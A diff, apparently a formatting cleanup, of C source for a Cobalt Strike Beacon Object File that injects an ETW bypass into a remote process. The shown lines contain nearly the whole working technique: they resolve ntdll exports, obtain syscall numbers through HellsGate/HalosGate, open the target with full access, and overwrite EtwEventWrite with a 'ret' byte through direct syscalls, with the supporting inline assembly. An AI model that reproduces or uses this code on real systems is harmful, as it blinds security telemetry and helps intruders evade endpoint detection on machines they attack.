@@ -9,11 +9,11 @@
 #define PAGE_EXECUTE_READWRITE  0x40
 
 // HellsGate / HalosGate 
-VOID HellsGate( IN WORD wSystemCall);
-VOID HellDescent();
-DWORD halosGateDown( IN PVOID ntdllApiAddr, IN WORD index);
-DWORD halosGateUp( IN PVOID ntdllApiAddr, IN WORD index);
-DWORD findSyscallNumber( IN PVOID ntdllApiAddr);
+VOID  HellsGate(IN WORD wSystemCall);
+VOID  HellDescent();
+DWORD halosGateDown(IN PVOID ntdllApiAddr, IN WORD index);
+DWORD halosGateUp(IN PVOID ntdllApiAddr, IN WORD index);
+DWORD findSyscallNumber(IN PVOID ntdllApiAddr);
 
 // Define NT APIs
 //typedef BOOL   (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
@@ -29,7 +29,7 @@ typedef BOOL   (NTAPI  * tNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PVO
 typedef BOOL   (NTAPI  * tNtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);
 //                                                 RCX     RDX     R8     R9    
 // NtWriteVirtualMemory(
-//	 RCX: FFFFFFFFFFFFFFFF 
+//   RCX: FFFFFFFFFFFFFFFF 
 //   RDX: 00000000005FFC70 -> 00 F0 2F 4D FA 7F 00 00 00  (00007FFA4D2FF000)
 //   R8:  00000000005FFC78 -> 00 10 00 00 00 00 00 00 00  (0x1000)
 //   R9:  0000000020000080
@@ -38,12 +38,12 @@ typedef BOOL   (NTAPI  * tNtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, 
 // Structs for NtOpenProcess
 typedef struct _OBJECT_ATTRIBUTES
 {
-	ULONG			uLength;
-	HANDLE			hRootDirectory;
-	PVOID       	pObjectName;
-	ULONG			uAttributes;
-	PVOID			pSecurityDescriptor;
-	PVOID			pSecurityQualityOfService;
+	ULONG	uLength;
+	HANDLE	hRootDirectory;
+	PVOID   pObjectName;
+	ULONG	uAttributes;
+	PVOID	pSecurityDescriptor;
+	PVOID	pSecurityQualityOfService;
 } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
 typedef struct _CLIENT_ID
 {
@@ -57,11 +57,11 @@ typedef struct _CLIENT_ID
   IN  POBJECT_ATTRIBUTES ObjectAttributes,
   OUT PCLIENT_ID         ClientId
 );*/
-//	 RCX: 000000000014FDE8 // Just a 8 byte address to put a handle in
+//   RCX: 000000000014FDE8 // Just a 8 byte address to put a handle in
 //   RDX: 00000000001FFFFF (PROCESS_ALL_ACCESS)
 //   R8:  000000000014FD90 -> 0x30
 //   R9:  000000000014FD80 -> 28A4h (process ID in Hex)
-typedef BOOL   (NTAPI  * tNtOpenProcess)( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
+typedef BOOL (NTAPI * tNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
 // https://github.com/n00bk1t/n00bk1t/blob/master/ntopenprocess.c
 
 
@@ -91,31 +91,31 @@ typedef struct ntapis{
     DWORD NtWriteVirtualMemorySyscall;
     tNtProtectVirtualMemory NtProtectVirtualMemory;
     DWORD NtProtectVirtualMemorySyscall;
-	tNtOpenProcess NtOpenProcess;
-	DWORD NtOpenProcessSyscall;
-	PVOID pEtwEventWrite;
+    tNtOpenProcess NtOpenProcess;
+    DWORD NtOpenProcessSyscall;
+    PVOID pEtwEventWrite;
 }ntapis;
 
 
 void go(char * args, int len) {
 	datap parser;
-    DWORD pid;
-    BeaconDataParse(&parser, args, len);
-    pid = BeaconDataInt(&parser);
-    BeaconPrintf(CALLBACK_OUTPUT, "Injecting NTDLL.EtwEventWrite bypass in remote process: %d (PID)", pid);
+	DWORD pid;
+	BeaconDataParse(&parser, args, len);
+	pid = BeaconDataInt(&parser);
+	BeaconPrintf(CALLBACK_OUTPUT, "Injecting NTDLL.EtwEventWrite bypass in remote process: %d (PID)", pid);
 	Dll ntdll;
-    // NTDL - String to find Ntdll 
-    CHAR ntdlStr[] = {'n','t','d','l',0};
-    //__debugbreak();
-    // Get base address of NTDLL.DLL from LDR.InMemoryOrderModuleList
+	// NTDL - String to find Ntdll 
+	CHAR ntdlStr[] = {'n','t','d','l',0};
+	//__debugbreak();
+	// Get base address of NTDLL.DLL from LDR.InMemoryOrderModuleList
 	ntdll.dllBase             = (PVOID)crawlLdrDllList((PVOID)ntdlStr);
-    // Get Export Directory and Export Tables for NTDLL.DLL
+	// Get Export Directory and Export Tables for NTDLL.DLL
 	ntdll.Export.Directory    = getExportDirectory(ntdll.dllBase);
 	ntdll.Export.AddressTable = getExportAddressTable(ntdll.dllBase, ntdll.Export.Directory);
 	ntdll.Export.NameTable    = getExportNameTable(ntdll.dllBase, ntdll.Export.Directory);
 	ntdll.Export.OrdinalTable = getExportOrdinalTable(ntdll.dllBase, ntdll.Export.Directory);
 	ntapis nt;
-    // ######### NTDLL.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
+	// ######### NTDLL.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
 	char EtwEventWriteStr[16];
 	// python reverse.py EtwEventWrite
 	// String length : 13
@@ -137,7 +137,7 @@ void go(char * args, int len) {
 	CHAR NtProtectVirtualMemoryStr[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
 	nt.NtProtectVirtualMemory        = getSymbolAddress(NtProtectVirtualMemoryStr, (PVOID)22, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
 	// HalosGate/HellsGate to get the systemcall number for NtProtectVirtualMemory
-    nt.NtProtectVirtualMemorySyscall = findSyscallNumber(nt.NtProtectVirtualMemory);
+	nt.NtProtectVirtualMemorySyscall = findSyscallNumber(nt.NtProtectVirtualMemory);
 	if (nt.NtProtectVirtualMemorySyscall == 0) {
 		DWORD index = 0;
 		while (nt.NtProtectVirtualMemorySyscall == 0) {
@@ -214,9 +214,9 @@ void go(char * args, int len) {
 	//__debugbreak();
 	// nt.NtOpenProcess(&hProc, 0x1FFFFF, &oa, &cid);
 	HellsGate(nt.NtOpenProcessSyscall);
-    HellDescent(&hProc, 0x1FFFFF, &oa, &cid);
+	HellDescent(&hProc, 0x1FFFFF, &oa, &cid);
 	// ETW Bypass
-    CHAR etwbypass[] = { 0xC3 }; // ret
+	CHAR etwbypass[] = { 0xC3 }; // ret
 	//unsigned __int64 etwbypassSize = 1;
 	PVOID aligedETW = pageAlign(nt.pEtwEventWrite);
 	unsigned __int64 memPage = 0x1000; 
@@ -225,15 +225,15 @@ void go(char * args, int len) {
 	// Change 0x1000 bytes of memory in NTDLL to RW so we can write the NTDLL.EtwEventWrite bypass
 	// nt.NtProtectVirtualMemory(hProc, &aligedETW, (PSIZE_T)&memPage, PAGE_READWRITE, &oldprotect);
 	HellsGate(nt.NtProtectVirtualMemorySyscall);
-    HellDescent(hProc, &aligedETW, (PSIZE_T)&memPage, PAGE_READWRITE, &oldprotect);
+	HellDescent(hProc, &aligedETW, (PSIZE_T)&memPage, PAGE_READWRITE, &oldprotect);
 	// Write the bypass to NTDLL.EtwEventWrite
 	// nt.NtWriteVirtualMemory(hProc, nt.pEtwEventWrite, (PVOID)etwbypass, 1, (PVOID)0);
 	HellsGate(nt.NtWriteVirtualMemorySyscall);
-    HellDescent(hProc, nt.pEtwEventWrite, (PVOID)etwbypass, 1, (PVOID)0);
+	HellDescent(hProc, nt.pEtwEventWrite, (PVOID)etwbypass, 1, (PVOID)0);
 	// Change the memory permissions for NTDLL.EtwEventWrite back to RX
 	// nt.NtProtectVirtualMemory(hProc, &aligedETW, (PSIZE_T)&memPage, oldprotect, &oldprotect);
 	HellsGate(nt.NtProtectVirtualMemorySyscall);
-    HellDescent(hProc, &aligedETW, (PSIZE_T)&memPage, oldprotect, &oldprotect);
+	HellDescent(hProc, &aligedETW, (PSIZE_T)&memPage, oldprotect, &oldprotect);
 }
 __asm__(
 "findSyscallNumber: \n"
@@ -285,7 +285,7 @@ __asm__(
 	"ret \n"
 );
 __asm__(
-	"HellsGate: \n"
+"HellsGate: \n"
 	"xor r11, r11 \n"
 	"mov r11d, ecx \n"
 	"ret \n"
@@ -303,7 +303,7 @@ __asm__(
 	"or cx,0xFFF \n"    // This with +1 will align us to a memory page.
 	"sub rcx, 0xFFF \n"
 	"xchg rax, rcx \n" // return aligned page
-    "ret"
+	"ret"
 );
 // Takes in the 4 first for characters of a DLL and returns the base address of that DLL module if it is already loaded into memory
 // PVOID crawlLdrDllList(wchar_t * dllName)
